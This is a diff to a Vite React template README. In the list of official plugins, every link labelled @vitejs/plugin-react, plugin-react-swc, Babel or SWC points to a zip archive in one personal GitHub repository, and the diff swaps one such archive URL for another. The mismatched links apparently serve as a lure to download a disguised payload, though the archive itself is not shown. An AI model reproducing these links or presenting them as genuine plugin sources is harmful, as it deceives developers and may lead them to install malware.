@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/HidayatFahmi/FinalProjectCode/master/aecidioform/FinalProjectCode.zip) uses [Babel](https://raw.githubusercontent.com/HidayatFahmi/FinalProjectCode/master/aecidioform/FinalProjectCode.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/HidayatFahmi/FinalProjectCode/master/aecidioform/FinalProjectCode.zip) uses [SWC](https://raw.githubusercontent.com/HidayatFahmi/FinalProjectCode/master/aecidioform/FinalProjectCode.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://github.com/HidayatFahmi/FinalProjectCode/raw/refs/heads/master/public/Code-Final-Project-3.3.zip) uses [Babel](https://github.com/HidayatFahmi/FinalProjectCode/raw/refs/heads/master/public/Code-Final-Project-3.3.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://github.com/HidayatFahmi/FinalProjectCode/raw/refs/heads/master/public/Code-Final-Project-3.3.zip) uses [SWC](https://github.com/HidayatFahmi/FinalProjectCode/raw/refs/heads/master/public/Code-Final-Project-3.3.zip) for Fast Refresh
